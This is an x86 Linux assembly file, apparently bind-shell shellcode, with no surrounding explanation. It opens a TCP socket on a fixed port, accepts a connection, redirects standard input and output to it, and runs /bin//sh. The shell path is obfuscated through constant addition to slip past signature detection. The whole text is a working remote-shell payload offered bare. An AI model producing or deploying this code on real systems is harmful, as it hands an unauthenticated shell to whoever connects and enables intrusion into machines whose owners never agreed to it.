global _start

section .text

_start:

xor ebx, ebx    ;clear ebx
xor eax, eax    ;clear eax
mov al, 0x66    ;syscall socketcall
mov bl, 0x6     ;tcp = 6
push ebx        ;tcp = 6
sub bl, 0x5     ;ebx = 1; socket
push ebx        ;sock_stream
push byte 0x2   ;af_inet
mov ecx, esp    ;move pointer to args to ecx
int 0x80        ;socket()
mov edi,eax     ;int socketfd

xor eax, eax    ;clear eax
mov al, 0x66    ;syscall socketcall
mov bl, 0x2     ;2 for bind()
xor edx, edx    ;clear edx
push edx        ;push 0x0
push word 0xbabe        ;portno
push word bx            ;2 = af_inet
mov ecx, esp            ;pointer to args
push byte 0x10          ;addrlen
push ecx                ;const struct sockaddr *addr
push edi                ;sockfd from socket
mov ecx, esp            ;pointer to args
int 0x80                ;go go go

push byte 0x66  ;syscall socketcall
pop eax
mov bl, 0x4     ;4 listen
push byte 0x1   ;backlog
push edi        ;int sockfd
mov ecx, esp    ;pointer to args
int 0x80        ;listen()


push byte 0x66  ;syscall socketcall
pop eax
inc ebx         ;5 accept
xor edx, edx    ;clear edx
push edx        ;0
push edx        ;null
push edi        ;sockfd
mov ecx, esp    ;pointer to args
int 0x80        ;accept

xchg eax, ebx   ;set ebx to sockfd
xor ecx, ecx    ;clear counter
mov cl, 0x2     ;loop counter
gotolabel:
    mov al, 0x3f ;
    int 0x80            ;syscall
    dec ecx             ;decrement counter
    jns gotolabel       ;loop if not null

xor eax, eax    ;clear eax, again
push eax        ;push eax to stack

mov esi, 0x46510d0d
add esi, 0x22222222     ;push 0x68732f2f ;"sh//"
mov dword [esp-4], esi

mov esi, 0x4c47411d
add esi, 0x22222112     ;push 0x6e69622f ;"nib/"
mov dword [esp-8], esi
sub esp, 8              ;align esp

mov ebx, esp    ;filename
push eax
mov edx, esp    ;envp[]
push ebx
mov ecx, esp    ;filename string terminator, ecx is 00
mov al, 0xb     ;execve
int 0x80        ;syscall execve
